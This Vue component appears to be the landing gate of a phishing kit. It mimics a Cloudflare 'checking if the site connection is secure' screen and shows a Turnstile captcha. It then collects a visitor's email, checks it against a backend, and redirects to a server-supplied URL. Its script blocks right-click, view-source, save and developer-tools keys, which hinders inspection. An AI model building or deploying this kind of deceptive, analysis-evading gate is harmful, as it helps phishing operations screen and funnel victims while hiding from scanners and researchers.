<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="background">
    <div class="toto-container">
      <div class="header">
        <div class="logo-text">
          <span class="success-check">⼈</span>
        </div>
      </div>

      <div class="content">
        <p><strong>Please confirm your email address to continue.</strong></p>

        <div class="form-wrapper">
          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input
            id="honeypot"
            v-model="honeypot"
            type="text"
            tabindex="-1"
            autocomplete="off"
            aria-hidden="true"
            class="visually-hidden"
          />

          <label for="email" class="visually-hidden">Email address</label>
          <input
            id="email"
            v-model="email"
            type="email"
            placeholder="Enter email"
            required
            class="email-input"
            :disabled="loading"
          />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button @click="submitForm" :disabled="loading" class="action-button">
            {{ loading ? 'Submitting…' : 'Submit' }}
          </button>
        </div>
      </div>

      <div class="divider"></div>

      <div class="footer-container">
        <p class="footer-text">
          © 2025 All rights reserved.
          <a href="/privacy" target="_blank">Privacy Policy</a> |
          <a href="/terms" target="_blank">Terms</a>
        </p>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => { captchaToken.value = token }
    })
    turnstileRendered = true
  }
})

async function submitForm() {
  error.value = ''
  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      setTimeout(() => {
        window.location.href = data.redirectUrl
      }, 1500)
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>

<style scoped>
.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}
.footer-container {
  text-align: center;
}
.footer-text {
  font-size: 0.78rem;
  color: #555;
  margin-top: 0.25rem;
}
.footer-text a {
  color: inherit;
  text-decoration: none;
}
.footer-text a:hover {
  text-decoration: underline;
}
</style>
